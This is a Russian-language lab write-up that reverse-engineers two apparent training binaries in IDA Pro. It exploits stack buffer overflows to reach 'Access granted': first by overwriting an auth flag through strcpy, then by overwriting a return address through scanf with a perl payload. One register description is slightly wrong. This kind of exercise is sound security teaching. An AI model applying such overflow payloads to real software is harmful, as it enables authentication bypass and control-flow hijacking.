1) Открываем auth_overflow в ida pro.
2) В "Function window" видим необходимую нам функцию: check_authentication.

check_authentication proc near

        src             = qword ptr -28h
        dest            = byte ptr -20h
        var_4           = dword ptr -4
        ; __unwind {
            push    rbp
            mov     rbp, rsp
            sub     rsp, 30h
            mov     [rbp+src], rdi
            mov     [rbp+var_4], 0
            mov     rdx, [rbp+src]
            lea     rax, [rbp+dest]
            mov     rsi, rdx        ; src
            mov     rdi, rax        ; dest
            call    _strcpy
            lea     rax, [rbp+dest]
            lea     rsi, s2         ; "brillig"
            mov     rdi, rax        ; s1
            call    _strcmp
            test    eax, eax
            jnz     short loc_40064B
            mov     [rbp+var_4], 1
loc_40064B:
            lea     rax, [rbp+dest]
            lea     rsi, aOutgrabe  ; "outgrabe"
            mov     rdi, rax        ; s1
            call    _strcmp
            test    eax, eax
            jnz     short loc_400669
            mov     [rbp+var_4], 1
loc_400669:
            mov     eax, [rbp+var_4]
            leave
            retn
            ; }

3) Проанализировав функцию, делаем следующий вывод:

- var_4 соответствует auth_flag в исходном коде программы, т.к её значение
  перд эпилогом функции сохраняется в регистр eax, который является регистром
  возврата.

- dest соответствует password_buffer, т.к. перед вызовом функции strcpy его
  адрес сохраняется в rdi, который используется в качестве первого аргумента
  при вызове функции.

- src соответствует password, т.к. ее значение сохраняется в rsi,
  который используется для хранения первого аргумента при вызове функции.

4) Заметим, что используется функция _strcpy, которая при выходе за границы
   массива продолжает перезаписывать ячейки памяти.

   Следовательно, необходимо записать в dest то количество символов, которое
   позволит изменить значение var_4 на любое, отличное 0.

5) dest имеет смещение по стеку 20h, а var_4 - 4. Следовательно, искомое число
   символов будет равняться: 20h - 4 = 28. (28 байт требуется для достижения
   var_4). Следовательно, нужно ввести минимум 29 симовлов.

6) Какой же максимум?
   Т.к var_4 занимает 4 байта, логично предположить, что 28 + 4 = 32. Но это не
   совсем так. Требуется учесть, что _strcpy перезаписывает на 1 байт больше
   т.к копирует в выходной буфер нулевой символ. Следовательно, верный ответ -
   32 символа.

7) Что будет, если ввести больше 32 символов?
   Программа прекратит своё выполнение с ошибкой.

Ответ на первую часть:
Достаточно ввести рандомную строку длиной от 29 до 32 символов, для получения
"Access granted".






1) Открываем auth_overflow2 в ida pro.
2) В "Function window" видим необходимую нам функцию: check_authentication.
3) Проанализировав функцию, видим:
   - На стеке выделяется 1 переменная со смещением 10h, которая и есть
     password_buffer (Её адрес передается в rsi перед вызовом ___isoc99_scanf).
   - Функция ___isoc99_scanf не проверяет границы, а это значит, что можно
     перезаписать адрес возврата из функции check_authentication на адрес
     функции granted.
4) В "Function window" ищем функцию granted и копируем её адрес:
            00000000004005A7
5) Расчитаем, сколько байтов надо пройти, чтобы достич адреса возврата:

   Стек выглядит следующим образом:
   - Переменные стека (в этом случае 10h).
   - Указатель кадра.
   - Адрес возврата.

   Т.к мы используем 64 битные регистры => указатель кадра и адрес возрата
   равны 8 байтам.

   Число байт до адреса возврата равно: 10h + 8 = 24. Следовательно, сначала
   необходимо ввести 24 рандомных символа.

6) Получение ответа:
   После рандомных символов необходимо добавить адрес возврата. Но, стоит
   учесть, что х86 является little-endian архитектурой, следовательно
   00000000004005A7 превращается в A705400000000000.

7) Стоит учесть, что ввести через консоль:
            aaaaaaaaaaaaaaaaaaaaaaaaA705400000000000
   не получится, т.к A705400000000000 расположатся по ячейчам. Гугл
   подсказал следующий вариант:
        perl -e 'print "a"x24 . "\xA7\x05\x40" . "\x00"x5' | ./auth_overflow2

Ответ на вторую часть:
Достаточно ввести perl -e 'print "a"x24 . "\xa7\x05\x40" . "\x00"x5' |
./auth_overflow2, для получения "Access granted".
